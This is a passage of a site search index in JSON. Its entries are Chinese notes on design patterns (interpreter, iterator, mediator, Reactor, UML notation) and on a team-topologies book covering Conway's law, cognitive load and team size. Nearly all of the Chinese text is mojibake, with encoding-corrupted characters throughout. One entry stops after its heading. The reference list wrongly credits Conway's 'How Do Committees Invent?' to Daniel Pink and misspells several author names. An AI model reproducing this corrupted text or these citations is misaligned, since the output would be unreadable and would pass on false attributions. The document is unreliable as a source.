ä½¿ç”¨å‘½ä»¤æ¨¡å¼å¯èƒ½ä¼šå¯¼è‡´æŸäº›ç³»ç»Ÿæœ‰è¿‡å¤šçš„å…·ä½“å‘½ä»¤ç±»ã€‚  "},{"id":417,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/16.%E8%A7%A3%E9%87%8A%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"16.è§£é‡Šå™¨æ¨¡å¼","section":"3.è¡Œä¸ºå‹æ¨¡å¼","content":"è§£é‡Šå™¨æ¨¡å¼ #  è§£é‡Šå™¨æ¨¡å¼ï¼ˆInterpreter Patternï¼‰æä¾›äº†è¯„ä¼°è¯­è¨€çš„è¯­æ³•æˆ–è¡¨è¾¾å¼çš„æ–¹å¼ï¼Œå®ƒå±äºè¡Œä¸ºå‹æ¨¡å¼ã€‚\nè¿™ç§æ¨¡å¼å®ç°äº†ä¸€ä¸ªè¡¨è¾¾å¼æ¥å£ï¼Œè¯¥æ¥å£è§£é‡Šä¸€ä¸ªç‰¹å®šçš„ä¸Šä¸‹æ–‡ã€‚è¿™ç§æ¨¡å¼è¢«ç”¨åœ¨ SQL è§£æã€ç¬¦å·å¤„ç†å¼•æ“ç­‰ã€‚\nä»‹ç» #  æ„å›¾ï¼š\n  ç»™å®šä¸€ä¸ªè¯­è¨€ï¼Œå®šä¹‰å®ƒçš„æ–‡æ³•è¡¨ç¤ºï¼Œå¹¶å®šä¹‰ä¸€ä¸ªè§£é‡Šå™¨ï¼Œè¿™ä¸ªè§£é‡Šå™¨ä½¿ç”¨è¯¥æ ‡è¯†æ¥è§£é‡Šè¯­è¨€ä¸­çš„å¥å­ã€‚\n  å¯¹äºä¸€äº›å›ºå®šæ–‡æ³•æ„å»ºä¸€ä¸ªè§£é‡Šå¥å­çš„è§£é‡Šå™¨ã€‚\n  **å¦‚ä½•è§£å†³ï¼š**æ„å»ºè¯­æ³•æ ‘ï¼Œå®šä¹‰ç»ˆç»“ç¬¦ä¸éç»ˆç»“ç¬¦ã€‚\nåº”ç”¨å®ä¾‹ï¼š\n ç¼–è¯‘å™¨ã€è¿ç®—è¡¨è¾¾å¼è®¡ç®—ã€‚ ä¸€ä¸ªç®€å•è¯­æ³•éœ€è¦è§£é‡Šçš„åœºæ™¯ã€‚  ä¼˜ç‚¹ï¼š\n å¯æ‰©å±•æ€§æ¯”è¾ƒå¥½ï¼Œçµæ´»ã€‚ å¢åŠ äº†æ–°çš„è§£é‡Šè¡¨è¾¾å¼çš„æ–¹å¼ã€‚ æ˜“äºå®ç°ç®€å•æ–‡æ³•ã€‚  ç¼ºç‚¹ï¼š\n å¯åˆ©ç”¨åœºæ™¯æ¯”è¾ƒå°‘ã€‚ å¯¹äºå¤æ‚çš„æ–‡æ³•æ¯”è¾ƒéš¾ç»´æŠ¤ã€‚ è§£é‡Šå™¨æ¨¡å¼ä¼šå¼•èµ·ç±»è†¨èƒ€ã€‚ è§£é‡Šå™¨æ¨¡å¼é‡‡ç”¨é€’å½’è°ƒç”¨æ–¹æ³•ã€‚  PostScript:\n å¯åˆ©ç”¨åœºæ™¯æ¯”è¾ƒå°‘ï¼ŒJAVA ä¸­å¦‚æœç¢°åˆ°å¯ä»¥ç”¨ expression4J ä»£æ›¿ã€‚  "},{"id":418,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/17.%E8%BF%AD%E4%BB%A3%E5%99%A8%E6%A8%A1%E5%BC%8F/","title":"17.è¿­ä»£å™¨æ¨¡å¼","section":"3.è¡Œä¸ºå‹æ¨¡å¼","content":"è¿­ä»£å™¨æ¨¡å¼ #  è¿­ä»£å™¨æ¨¡å¼ï¼ˆIterator Patternï¼‰æ˜¯ Java å’Œ .Net ç¼–ç¨‹ç¯å¢ƒä¸­éå¸¸å¸¸ç”¨çš„è®¾è®¡æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼ç”¨äºé¡ºåºè®¿é—®é›†åˆå¯¹è±¡çš„å…ƒç´ ï¼Œä¸éœ€è¦çŸ¥é“é›†åˆå¯¹è±¡çš„åº•å±‚è¡¨ç¤ºã€‚\nä»‹ç» #  æ„å›¾ï¼š\n æä¾›ä¸€ç§æ–¹æ³•é¡ºåºè®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡ä¸­å„ä¸ªå…ƒç´ , è€Œåˆæ— é¡»æš´éœ²è¯¥å¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚ ä¸»è¦æœ‰ä»¥ä¸‹çš„éœ€æ±‚æ—¶ï¼Œå¯ä»¥ä½¿ç”¨è¿­ä»£å™¨æ¨¡å¼ï¼š  è®¿é—®ä¸€ä¸ªèšåˆå¯¹è±¡çš„å†…å®¹è€Œæ— é¡»æš´éœ²å®ƒçš„å†…éƒ¨è¡¨ç¤ºã€‚ éœ€è¦ä¸ºèšåˆå¯¹è±¡æä¾›å¤šç§éå†æ–¹å¼ã€‚ ä¸ºéå†ä¸åŒçš„èšåˆç»“æ„æä¾›ä¸€ä¸ªç»Ÿä¸€çš„æ¥å£ã€‚    ä¼˜ç‚¹ï¼š\n å®ƒæ”¯æŒä»¥ä¸åŒçš„æ–¹å¼éå†ä¸€ä¸ªèšåˆå¯¹è±¡ã€‚ è¿­ä»£å™¨ç®€åŒ–äº†èšåˆç±»ã€‚ åœ¨åŒä¸€ä¸ªèšåˆä¸Šå¯ä»¥æœ‰å¤šä¸ªéå†ã€‚ åœ¨è¿­ä»£å™¨æ¨¡å¼ä¸­ï¼Œå¢åŠ æ–°çš„èšåˆç±»å’Œè¿­ä»£å™¨ç±»éƒ½å¾ˆæ–¹ä¾¿ï¼Œæ— é¡»ä¿®æ”¹åŸæœ‰ä»£ç ã€‚  ç¼ºç‚¹ï¼š\n ç”±äºè¿­ä»£å™¨æ¨¡å¼å°†å­˜å‚¨æ•°æ®å’Œéå†æ•°æ®çš„èŒè´£åˆ†ç¦»ï¼Œå¢åŠ æ–°çš„èšåˆç±»éœ€è¦å¯¹åº”å¢åŠ æ–°çš„è¿­ä»£å™¨ç±»ï¼Œç±»çš„ä¸ªæ•°æˆå¯¹å¢åŠ ï¼Œè¿™åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ç³»ç»Ÿçš„å¤æ‚æ€§ã€‚  "},{"id":419,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/3.%E8%A1%8C%E4%B8%BA%E5%9E%8B%E6%A8%A1%E5%BC%8F/18.%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F/","title":"18.ä¸­ä»‹è€…æ¨¡å¼","section":"3.è¡Œä¸ºå‹æ¨¡å¼","content":"ä¸­ä»‹è€…æ¨¡å¼ #  ä¸­ä»‹è€…æ¨¡å¼ï¼ˆMediator Patternï¼‰æ˜¯ç”¨æ¥é™ä½å¤šä¸ªå¯¹è±¡å’Œç±»ä¹‹é—´çš„é€šä¿¡å¤æ‚æ€§ã€‚\nè¿™ç§æ¨¡å¼æä¾›äº†ä¸€ä¸ªä¸­ä»‹ç±»ï¼Œè¯¥ç±»é€šå¸¸å¤„ç†ä¸åŒç±»ä¹‹é—´çš„é€šä¿¡ï¼Œå¹¶æ”¯æŒæ¾è€¦åˆï¼Œä½¿ä»£ç æ˜“äºç»´æŠ¤ã€‚\nä»‹ç» #  "},{"id":420,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/reactor%E6%A8%A1%E5%BC%8F/","title":"Reactoræ¨¡å¼","section":"DesignPatterns","content":"Reactor æ¨¡å¼ #  ä¸€ä¸ªç½‘ç»œè¿æ¥å¯¹åº”äºä¸€ä¸ªçº¿ç¨‹å¤„ç†ï¼Œæ˜¯æœ€åŸå§‹çš„ Web åº”ç”¨æ¨¡å‹ï¼š\nä½†æ˜¯è¿™ç§æ¨¡å‹å¯¹æ¯ä¸ªè¿æ¥éƒ½åˆ›é€ ä¸€ä¸ª handler å®¹æ˜“é‡åˆ°ç“¶é¢ˆï¼Œè´Ÿè½½å¢åŠ æ—¶æ€§èƒ½ä¸‹é™éå¸¸å¿«ï¼š\n accept æ–¹æ³•ä¼šé˜»å¡ç­‰å¾… client è¿æ¥ï¼Œç›´åˆ° client è¿æ¥æˆåŠŸï¼› read æ–¹æ³•ä» socket inputstream è¯»å–æ•°æ®ï¼Œä¼šé˜»å¡çº¿ç¨‹ç›´åˆ°å®Œæˆæ•°æ®è¯»å–ï¼› write æ–¹æ³•ä¼šå†™å…¥è¾“å…¥åˆ° socket outstreamï¼Œä¼šé˜»å¡çº¿ç¨‹ç›´åˆ°æ•°æ®å†™å®Œï¼›  ä¸Šé¢åˆ—ä¸¾çš„ä¸‰ç§æ–¹æ³•çš„ç‰¹ç‚¹æ˜¯ï¼šéƒ½æ˜¯å¼•èµ· IO çš„é˜»å¡æ–¹æ³•ï¼Œè¿™ç§åŸå§‹çš„åº”ç”¨æ¨¡å¼ä¼šå¯¼è‡´å¤§é‡çº¿ç¨‹ç©ºè½¬ã€‚ä½¿ç”¨ä¸€ä¸ªä¸­å¿ƒçš„ Reactor æ¥å¤„ç†æ‰€æœ‰ä¼šå¼•èµ·é˜»å¡çš„æ–¹æ³•ï¼Œå°±æ˜¯ Reactor æ¨¡å¼ï¼š\nè€Œä¸Šé¢è¿™ç§è®¾è®¡æ¨¡å¼ï¼ŒReactor è¿è¡Œåœ¨å•çº¿ç¨‹ä¸­ï¼Œå®¹æ˜“æˆä¸ºé«˜å¹¶å‘è®¡ç®—æœºç³»ç»Ÿçš„æ€§èƒ½ç“¶é¢ˆã€‚\näºæ˜¯æˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªçº¿ç¨‹æ± å¤„ç†å·²ç»è¿æ¥çš„æ‰€æœ‰å®¢æˆ·ç«¯ï¼š\nåœ¨å¤š CPU çš„æœºå™¨ä¸Š Reactor åˆå¯ä»¥æ‹†åˆ†æˆ mainReactor å’Œ subReactorï¼š\n"},{"id":421,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/uml/","title":"Uml","section":"DesignPatterns","content":"ç¤ºä¾‹ #  classDiagram ç»§æ‰¿ \u0026lt;|-- Inheritance ç»„æˆ *-- Composition èšåˆ o-- Aggregation å…³è” \u0026lt;-- Association é“¾æ¥ -- Link Solid ä¾èµ– \u0026lt;.. Dependency å®ç° \u0026lt;|.. Realization "},{"id":422,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/1.%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84%E7%9A%84%E9%99%B7%E9%98%B1/","title":"1.ç»„ç»‡ç»“æ„çš„é™·é˜±","section":"é«˜æ•ˆèƒ½å›¢é˜Ÿæ¨¡å¼","content":"ç¬¬ä¸€ç«  ç»„ç»‡ç»“æ„çš„é™·é˜± #  æ ¸å¿ƒè§‚ç‚¹ #  ä½œä¸ºç®¡ç†æ¥å£çš„æŠ€æœ¯äººå‘˜ï¼Œæˆ‘ä»¬å¿…é¡»æ”¹å˜ä¹‹å‰çš„æ€æƒ³ã€‚\n  ä¸å†å°†å›¢é˜Ÿè§†ä½œä¸ºä¸€ç»„å¯æ›¿æ¢çš„ä¸ªä½“ï¼Œå®ƒä»¬åªè¦æ²¿ç”¨â€œæ­£ç¡®â€çš„æµç¨‹å’Œä½¿ç”¨â€œæ­£ç¡®â€çš„å·¥å…·å°±èƒ½è·å¾—æˆåŠŸï¼›\n  è€Œæ˜¯å°†äººå‘˜å’ŒæŠ€æœ¯è§†ä½œä¸ºç¤¾ä¼šæŠ€æœ¯ç”Ÿæ€ç³»ç»Ÿä¸­çš„ä¸€ä»½å­ï¼Œæ­£å¦‚è®¡ç®—èŠ¯ç‰‡ä¸­çš„ç¢³å’Œç¡…ä¸€æ ·ï¼›\n  ç»„ç»‡ç»“æ„å’Œå®é™…çš„å·¥ä½œæ–¹å¼ä¹‹é—´å­˜åœ¨å‡ºå…¥ï¼š\n äººä»¬ä¸ºäº†å®Œæˆå·¥ä½œï¼Œé€šå¸¸ä¼šä¸å¦ä¸€æ¡æ±‡æŠ¥çº¿ä¸Šçš„äººå‘˜è¿›è¡Œæ¨ªå‘æˆ–çºµå‘æ²Ÿé€šï¼› ç»„ç»‡åº”è¯¥æœ‰æ„è¯†åœ°åŸ¹å…»è¿™ç§åˆ›é€ åŠ›å’Œè§£å†³é—®é¢˜çš„èƒ½åŠ›ï¼Œå¹¶ä»ä¸­å—ç›Šï¼Œè€Œä¸ä»…ä»…å±€é™äºè‡ªé¡¶å‘ä¸‹å’Œè‡ªåº•å‘ä¸Šçš„æ²Ÿé€šå’Œæ±‡æŠ¥ï¼›  æ¯ä¸ªç»„ç»‡éƒ½å­˜åœ¨ä¸‰ç§ç»„ç»‡ç»“æ„ï¼ˆçŸ¥è¯†å‹ç»„ç»‡æˆåŠŸçš„å…³é”®åœ¨äºåä¸¤è€…ï¼‰ï¼š\n å®˜æ–¹æ¶æ„ï¼ˆç»„ç»‡ç»“æ„å›¾ï¼‰ï¼Œä¿ƒè¿›åˆè§„æ€§ï¼› éæ­£å¼æ¶æ„ï¼Œä¸ªä½“é—´çš„â€œå½±å“èŒƒå›´â€ï¼› ä»·å€¼åˆ›é€ æ¶æ„ï¼Œå·¥ä½œæ˜¯å¦‚ä½•åœ¨ä¸ªäººé—´å’Œå›¢é˜Ÿé—´å®Œæˆçš„ï¼›  Naomi Stanford æ€»ç»“çš„äº”æ¡ç»„ç»‡è®¾è®¡æ³•åˆ™ï¼š\n æ ¹æ®ä»¤äººä¿¡æœçš„ç†ç”±æ¥è®¾è®¡ï¼› åé¦ˆï¼šä¸ºè®¾è®¡å†³ç­–æä¾›å¼€å‘é€‰é¡¹ï¼› é€‰æ‹©æ­£ç¡®çš„è®¾è®¡æ—¶æœºï¼› å®¹é”™ï¼šå¯»æ‰¾äº‹åŠ¡åç¦»è½¨è¿¹çš„çº¿ç´¢ï¼› åŠ¨æ€ï¼šå¯¹æœªæ¥ä¿æŒè­¦æƒ•ï¼›  å›¢é˜Ÿæ‹“æ‰‘æ˜¯ä¸€ç§å…¨æ–°çš„å›¢é˜Ÿæ€ç»´æ¨¡å¼ï¼š\n å®ƒæä¾›äº†å››ç±»åŸºæœ¬å›¢é˜Ÿç±»å‹ï¼šæµåŠ¨å¼å›¢é˜Ÿã€å¹³å°å›¢é˜Ÿã€èµ‹èƒ½å›¢é˜Ÿã€å¤æ‚å­ç³»ç»Ÿå›¢é˜Ÿï¼› ä»¥åŠä¸‰ç§æ ¸å¿ƒçš„å›¢é˜Ÿäº¤äº’æ¨¡å¼ï¼šåä½œæ¨¡å¼ã€æœåŠ¡æ¨¡å¼å’Œä¿ƒè¿›æ¨¡å¼ï¼›  åº·å¨å®šå¾‹ï¼š\n Melvin E. Conway: Any organization that designs a system (defined broadly) will produce a design whose structure is a copy of the organization\u0026rsquo;s communication structure. Eric Raymond ç»™å‡ºäº†ä¸€ä¸ªå¹½é»˜è€Œå½¢è±¡çš„ä¾‹å­ï¼šå¦‚æœæœ‰å››ä¸ªå°ç»„åˆä½œå¼€å‘ä¸€ä¸ªç¼–è¯‘å™¨ï¼Œé‚£ä¹ˆä½ å°†å¾—åˆ°ä¸€æ¬¾å…·æœ‰å››ä¸ªæ­¥éª¤çš„ç¼–è¯‘å™¨ï¼›  \u0010è®¤çŸ¥è´Ÿè·ï¼š\n  ä¸€ä¸ªäººåœ¨ç»™å®šæ—¶é—´å†…å¤§è„‘èƒ½å¤Ÿå­˜å‚¨çš„ä¿¡æ¯é‡ä¸Šé™ã€‚å¯¹ä¸€ä¸ªå›¢é˜Ÿæ¥è¯´å°±æ˜¯æ‰€æœ‰å›¢é˜Ÿæˆå‘˜çš„è®¤çŸ¥èƒ½åŠ›ä¸Šé™ï¼›\n  æˆ‘ä»¬éœ€è¦æŠŠå›¢é˜Ÿæ‘†åœ¨ç¬¬ä¸€ä½ï¼Œé¼“åŠ±å»é™åˆ¶ä»–ä»¬çš„è®¤çŸ¥è´Ÿè·ã€‚å°†è®¤çŸ¥è´Ÿè·ä½œä¸ºå›¢é˜Ÿè§„æ¨¡ã€åˆ†é…æŒ‡è´£å’Œå»ºç«‹å›¢é˜Ÿè¾¹ç•Œçš„æœ‰åŠ›å·¥å…·ï¼›\n  ä¾‹å­ğŸŒ°ï¼šä¸€ä¸ªè¿­ä»£å‘¨æœŸå†…é¢‘ç¹çš„åˆ‡æ¢ä»»åŠ¡ä¼šæå¤§çš„æ‰“å‡»å›¢é˜Ÿçš„ä¸»åŠ¨æ€§ã€‚å¯ä»¥é€šè¿‡ Daniel Pink æåˆ°çš„å†…åœ¨åŠ¨æœºä¸‰è¦ç´ è§£é‡Šï¼š\n è‡ªæ²»ï¼šè¢«å¤šä¸ªå›¢é˜Ÿæºæºä¸æ–­çš„è¯·æ±‚å’Œä¼˜å…ˆçº§æ·¹æ²¡ï¼ŒæŸå¤±äº†è‡ªæ²»æ€§ï¼› ç²¾é€šï¼šæ„å»ºäº†æ ·æ ·éƒ½æ‡‚ï¼Œå´æ— ä¸€ç²¾é€šçš„å›¢é˜Ÿï¼› ç›®æ ‡ï¼šä¸€ä¸ªå›¢é˜Ÿè´Ÿè´£è¿‡å¤šçš„æŒ‡è´£é¢†åŸŸï¼›    å¿«é€ŸæµåŠ¨çš„éšœç¢ï¼š\n è¿èƒŒåº·å¨å®šå¾‹ã€ç¼ºä¹æ¿€åŠ±ã€è¿‡å¤šæ„å¤–ã€æµåŠ¨é˜»å¡ã€æ¯éš”å‡ å¹´çš„ç—›è‹¦é‡æ„ã€å›¢é˜Ÿè¢«ç‰µæ‰¯è¿›å¤ªå¤šçš„æ–¹å‘ã€æ··ä¹±çš„ç»„ç»‡è®¾è®¡ã€è½¯ä»¶å¤ªå¤§è¶…å‡ºå›¢é˜Ÿèƒ½åŠ›èŒƒç•´ï¼›  å‚è€ƒä¹¦ç± #  Naomi Stanford:Guide to Organisation Design: Creaâ€ ing High Performing and Adaptable Enterprises;\nMark Schewarts\u0026rsquo;s Paper: Thinking Environment;\nGeary Rummler, Alan Brache: Improving Performance: How to Manage the White Space on the Organization Chart;\nNiels Pflegling: Organize for Complexity;\nDaniel Pink\u0026rsquo;s Datamation: How Do Committees Invent?\n"},{"id":423,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/2.%E5%BA%B7%E5%A8%81%E5%AE%9A%E5%BE%8B/","title":"2.åº·å¨å®šå¾‹","section":"é«˜æ•ˆèƒ½å›¢é˜Ÿæ¨¡å¼","content":"ç¬¬äºŒç«  åº·å¨å®šå¾‹ä¸ºä½•å¦‚æ­¤é‡è¦ #  åº·å¨å®šå¾‹ç°ä»£ç‰ˆæœ¬ï¼š\n å¦‚æœç³»ç»Ÿçš„æ¶æ„å’Œç»„ç»‡çš„æ¶æ„ä¸ä¸€è‡´ï¼Œé‚£ä¹ˆç»„ç»‡æ¶æ„å°†ä¼šæˆä¸ºèµ¢å®¶ï¼›  é€†åº·å¨å®šå¾‹ï¼š\n ç»„ç»‡éœ€è¦é€šè¿‡å›¢é˜Ÿå’Œç»„ç»‡ç»“æ„çš„æ”¹è¿›æ¥å®ç°é¢„æœŸçš„è½¯ä»¶æ¶æ„ï¼›  ç»è¿‡éªŒè¯çš„è½¯ä»¶æ¶æ„è‰¯å¥½å®è·µï¼š\n æ¾è€¦åˆï¼šç»„å»ºä¸å¼ºä¾èµ–äºå…¶ä»–ç»„ä»¶ï¼› é«˜å†…èšï¼šç»„ä»¶æ‹¥æœ‰æ¸…æ™°çš„æŒ‡è´£è¾¹ç•Œï¼Œå¹¶ä¸”å®ƒä»¬çš„å†…éƒ¨å…ƒç´ å¼ºç›¸å…³ï¼› æ¸…æ™°åˆç†çš„ç‰ˆæœ¬å…¼å®¹æ€§ï¼› æ¸…æ™°åˆç†çš„è·¨å›¢é˜Ÿæµ‹è¯•ï¼›  å°å¿ƒé‚£äº›æµäºè¡¨é¢çš„åº·å¨å®šå¾‹ï¼Œé”™è¯¯åœ°è§£è¯»åº·å¨å®šå¾‹å¯èƒ½ä¼šå¸¦æ¥é£é™©ï¼š\n å·¥å…·ï¼šç›²ç›®åœ°ä¸ºæ•´ä¸ªç»„ç»‡é€‰æ‹©å•ä¸€çš„å·¥å…·æ˜¯ä¸åˆé€‚çš„ï¼Œå¦‚æœä¸¤ä¸ªå›¢é˜Ÿçš„èŒè´£è¾¹ç•Œæ²¡æœ‰äº¤é›†ï¼Œé‚£ä¹ˆè¿˜åšæŒä½¿ç”¨ç›¸åŒçš„å·¥å…·å°±æ²¡æœ‰ä»€ä¹ˆä»·å€¼äº†ã€‚ç”¨ä¸€å¥è¯æ¦‚æ‹¬æ¥è¯´å°±æ˜¯ï¼šç‹¬ç«‹å›¢é˜Ÿä½¿ç”¨ç‹¬ç«‹å·¥å…·ï¼Œåä½œå›¢é˜Ÿä½¿ç”¨å…±äº«å·¥å…·ï¼› å¤šç»„ä»¶å›¢é˜Ÿï¼šå¾ˆå¤šç»„ç»‡è‰ç‡åœ°æŒ‰ç…§åº·å¨å®šå¾‹å»ºç«‹äº†å¤§é‡ä¸åŒçš„ç»„ä»¶å›¢é˜Ÿæ¥åˆ†åˆ«æ„å»ºç³»ç»Ÿçš„å„ä¸ªå°éƒ¨åˆ†ï¼› é€šè¿‡åå¤çš„ç»„ç»‡ç»“æ„è°ƒæ•´æ¥å»ºç«‹å±±å¤´æˆ–å‡å°‘äººå‘˜ï¼›  "},{"id":424,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E9%AB%98%E6%95%88%E8%83%BD%E5%9B%A2%E9%98%9F%E6%A8%A1%E5%BC%8F/3.%E5%9B%A2%E9%98%9F%E4%BC%98%E5%85%88/","title":"3.å›¢é˜Ÿä¼˜å…ˆ","section":"é«˜æ•ˆèƒ½å›¢é˜Ÿæ¨¡å¼","content":"ç¬¬ä¸‰ç«  å›¢é˜Ÿä¼˜å…ˆçš„æ€ç»´æ–¹å¼ #  æ¦‚è¿° #  ç°ä»£å¤æ‚ç³»ç»Ÿéœ€è¦é«˜æ•ˆèƒ½å›¢é˜Ÿï¼Œå¯¹äºéœ€è¦å¤§é‡ä¿¡æ¯çš„çŸ¥è¯†å¯†é›†å‹ã€é—®é¢˜è§£å†³å‹ä»»åŠ¡ï¼Œä¸€ä¸ªæœ‰å‡èšåŠ›çš„å›¢é˜Ÿçš„è¡¨ç°è¦è¿œè¿œè¶…å‡ºä¸ªäººçš„é›†åˆï¼›\nä¾èµ–ä¸ªä½“æ¥ç†è§£å’Œæœ‰æ•ˆå¤„ç†æ„å»ºå’Œæ¼”è¿›ç°ä»£è½¯ä»¶æ‰€éœ€è¦çš„ä¿¡æ¯é‡å’Œä¿¡æ¯çš„æœ¬è´¨æ˜¯ä¸å¯æŒç»­çš„ï¼Œå›¢é˜Ÿæ´»åŠ›è¿œæ¯”è°åœ¨å›¢é˜Ÿä¸­æ›´é‡è¦ï¼›\nå»ºè®¾å°è€Œç¾çš„é•¿æœŸå›¢é˜Ÿ #  å›¢é˜Ÿè§„æ¨¡ï¼š\n æœ¬ä¹¦ä¸­çš„å›¢é˜Ÿå®šä¹‰ï¼šä¸€ä¸ªç”± 5-9 äººç»„æˆçš„ç¨³å®šå°ç»„ï¼Œä½œä¸ºä¸€ä¸ªæ•´ä½“æœç€å…±åŒçš„ç›®æ ‡åŠªåŠ›ã€‚æˆ‘ä»¬ä¸åº”è¯¥æŠŠå·¥ä½œæŒ‡æ´¾ç»™ä¸ªäººï¼Œè€Œæ˜¯æŒ‡æ´¾ç»™å›¢é˜Ÿã€‚ ä¸€ä¸ªæœ‰æ•ˆçš„å›¢é˜Ÿæœ€å¤šç”± 7-9 äººç»„æˆã€‚  7-9 è¿™ä¸€äººæ•°é™åˆ¶æœ‰ç€æ˜ç¡®çš„ç†è®ºåŸºç¡€ï¼š\n Amazon æå‡ºçš„ â€œä¸¤å¼ æŠ«è¨â€ ç†è®ºï¼Œå³å›¢é˜Ÿè§„æ¨¡åº”è¯¥æ˜¯ä¸¤å¼ æŠ«è¨èƒ½å¤Ÿå–‚é¥±å…¨ä½“æˆå‘˜ï¼› è¿™ä¸€äººæ•°é™åˆ¶æ˜¯ Scrum æ¡†æ¶æ¨èçš„ï¼Œå®ƒæºäºå¯¹ç¾¤ä½“è®¤çŸ¥å’Œä¿¡ä»»çš„è¿›åŒ–é™åˆ¶ï¼› é‚“å·´æ•°å­—ï¼š15 æ˜¯ä¸€ä¸ªäººå¯ä»¥ä¿¡ä»»çš„äººæ•°æé™ï¼Œå…¶ä¸­åªæœ‰ 5 ä¸ªäººèƒ½å¤Ÿè·å¾—æ·±å…¥çš„äº†è§£å’Œä¿¡ä»»ï¼›  å°è§„æ¨¡å›¢é˜Ÿå¸¦æ¥ä¿¡ä»»ã€‚\nå·¥ä½œæµå‘é•¿æœŸå›¢é˜Ÿï¼š\n å›¢é˜Ÿéœ€è¦æ—¶é—´ç£¨åˆæ¥å®ç°é«˜æ•ˆï¼Œé€šå¸¸å›¢é˜Ÿéœ€è¦èŠ± 2 å‘¨åˆ° 3 ä¸ªæœˆç”šè‡³æ›´é•¿çš„æ—¶é—´æ¥å½¢æˆä¸€ä¸ªæœ‰å‡èšåŠ›çš„é›†ä½“ï¼› æå‡å›¢é˜Ÿå­˜æ´»å‘¨æœŸçš„æœ€ä½³åŠæ³•å°±æ˜¯æå‡å›¢é˜Ÿç¨³å®šæ€§ã€‚å›¢é˜Ÿåº”è¯¥ä¿æŒç¨³å®šï¼Œè€Œéä¸€æˆä¸å˜ï¼Œä»…åœ¨å¿…è¦çš„æ—¶å€™è¿›è¡Œå¶å°”çš„è°ƒæ•´ã€‚  è®©å›¢é˜Ÿå¯¹è½¯ä»¶è´Ÿè´£ï¼š\n è®©ä¸€ä¸ªå›¢é˜Ÿè´Ÿè´£ç³»ç»Ÿæˆ–å­ç³»ç»Ÿï¼› éœ€è¦æ˜ç¡®çš„æ˜¯ï¼šå›¢é˜Ÿä»£ç æ‰€æœ‰æƒåˆ’åˆ†å¹¶ä¸æ˜¯åœ¨åˆ’åˆ†åœ°ç›˜ï¼Œå›¢é˜Ÿå¯¹ä»£ç è´Ÿè´£å¹¶ç»´æŠ¤ï¼Œè€Œä¸åº”è¯¥è§‰å¾—ä»£ç æ˜¯å®ƒä»¬çš„è€Œå› æ­¤æ’æ–¥å…¶ä»–äººï¼›  å›¢é˜Ÿæˆå‘˜ä¹Ÿéœ€è¦å…·å¤‡å›¢é˜Ÿä¼˜å…ˆçš„æ€ç»´ï¼š\n å›¢é˜Ÿåº”è¯¥æ˜¯äº¤ä»˜çš„åŸºç¡€ï¼Œè€Œéä¸ªäººï¼› å³ä¾¿é€šè¿‡å¼•å¯¼ï¼Œæœ‰çš„äººä¾ç„¶ä¸é€‚åˆå›¢é˜Ÿçš„å·¥ä½œï¼Œæˆ–è€…ä¸æ„¿æ„å°†å›¢é˜Ÿçš„éœ€æ±‚æ”¾åœ¨ä¸ªäººéœ€æ±‚ä¹‹ä¸Šã€‚è¿™äº›äººä¼šå½±å“å›¢é˜Ÿå·¥ä½œï¼Œåœ¨æç«¯åœºåˆä¸‹ï¼Œç”šè‡³ä¼šæ‘§æ¯å›¢é˜Ÿï¼›  åœ¨å›¢é˜Ÿä¸­æ‹¥æŠ±å¤šæ ·æ€§ï¼š\n ä¸€ç‚¹å¼‚è´¨æ€§ä¼šæå¤§çš„å¸®åŠ©åˆ›å»ºä¸€ä¸ªå›¢é˜Ÿçš„å›¢é˜Ÿï¼›  å¥–åŠ±å›¢é˜Ÿè€Œéå¥–åŠ±ä¸ªäººã€‚\nè‰¯å¥½è®¾è®¡çš„è¾¹ç•Œå¯ä»¥æœ€å°åŒ–è®¤çŸ¥è´Ÿè· #  çº¦æŸå›¢é˜ŸèŒè´£ä»¥åŒ¹é…å›¢é˜Ÿè®¤çŸ¥è´Ÿè·ï¼š\n ä½¿ç”¨å›¢é˜Ÿä¼˜å…ˆæ–¹æ³•ï¼Œå›¢é˜Ÿçš„èŒè´£ä¸å›¢é˜Ÿæ‰€èƒ½å¤„ç†çš„è®¤çŸ¥è´Ÿè·æ˜¯å»åˆçš„ã€‚  Sweller å®šä¹‰äº†ä¸‰ç§ä¸åŒçš„è®¤çŸ¥è´Ÿè·ï¼š\n å›ºæœ‰è®¤çŸ¥è´Ÿè·ï¼Œä¸é—®é¢˜é¢†åŸŸçš„åŸºæœ¬ä»»åŠ¡ç›¸å…³ï¼› 